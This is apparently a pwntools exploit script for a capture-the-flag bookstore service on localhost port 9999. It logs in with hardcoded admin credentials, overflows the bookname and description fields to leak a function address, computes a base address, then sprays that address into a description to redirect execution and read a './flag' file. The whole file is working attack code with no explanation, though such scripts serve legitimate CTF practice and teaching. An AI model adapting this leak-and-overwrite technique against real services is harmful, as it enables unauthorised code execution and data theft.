from pwn import *
import time

r = remote('127.0.0.1', 9999)

#ID : helloadmin, PW : iulover!@#$
def login(user_id, user_pw) :
	print r.recvuntil('ID : ')
	r.send(user_id)
	time.sleep(1)
	print r.recvuntil('PASSWORD : ')
	r.send(user_pw)
    
	print r.recvuntil('> ')
	time.sleep(1)

def add_new_item(name, desc) :
    time.sleep(1)
    r.sendline('1')

    print r.recvuntil('Bookname :')
    r.sendline(name)
    print r.recvuntil('Description :')
    r.sendline(desc)
    print r.recvuntil('EBook)')
    r.sendline('0')

    print r.recvuntil('> ')

if __name__ == '__main__' :
	#login
	login('helloadmin', 'iulover!@#$')

	#add item
	add_new_item('name', 'name is min')
	
	r.sendline('3')
	print r.recvuntil('No : ')
	r.sendline('0')
	print r.recv(2048)
	
	#leak
	time.sleep(1)
	r.sendline('2')
	print r.recvuntil('No : ')
	r.sendline('0')

	time.sleep(1)
	print r.recv(4096)
	r.sendline('3')
	print r.recvuntil('Stock :')
	r.sendline('2147483647')
	print r.recvuntil('Price :')
	r.sendline('2147483647')
	print r.recvuntil('not)')
	r.sendline('0')
	print r.recvuntil('Avaliable :')
	r.sendline('1')
	print r.recvuntil('bookname')
	r.sendline('A'*20)
	print r.recv(128)
	print r.recvuntil('description')
	r.sendline('B'*300)
	print r.recv(1024)

	r.sendline('0')
	print r.recvuntil('> ')
	
	time.sleep(1)
	r.sendline('4')
	print r.recvuntil('A'*20)

	leak = r.recv(1024)

	leak = u32(leak[8:12]) - 210 #8:12 9DA is free shopping function
	print "Leak base address : " + hex(leak)

	#fileRead_func = leak + 0x8db
	#print "Clac file read func address : " + hex(fileRead_func)

	#exploit
	time.sleep(1)
	r.sendline('2')
	print r.recvuntil('No : ')
	r.sendline('0')

	time.sleep(1)
	print r.recv(2048)
	r.sendline('2')

	print r.recvuntil('description')
	r.sendline(p32(leak) * 750)

	print r.recv(1024)

	r.sendline('3')
	print r.recvuntil('Stock :')
	r.sendline('2147483647')
	print r.recvuntil('Price :')
	r.sendline('2147483647')
	print r.recvuntil('not)')
	r.sendline('0')
	print r.recvuntil('Avaliable :')
	r.sendline('0')
	print r.recvuntil('bookname')
	r.sendline('./flag\x00')
	print r.recv(128)
	print r.recvuntil('description')
	r.sendline('B'*300)

	print r.recv(1024)

	time.sleep(1)
	r.sendline('4')

	print r.recvuntil('shipping)')
	r.sendline('1')

	print r.recv(1024)
	r.sendline('0')
	print r.recvuntil('> ')

	r.sendline('3')
	print r.recvuntil('No : ')
	r.sendline('0')
	print r.recv(2048)
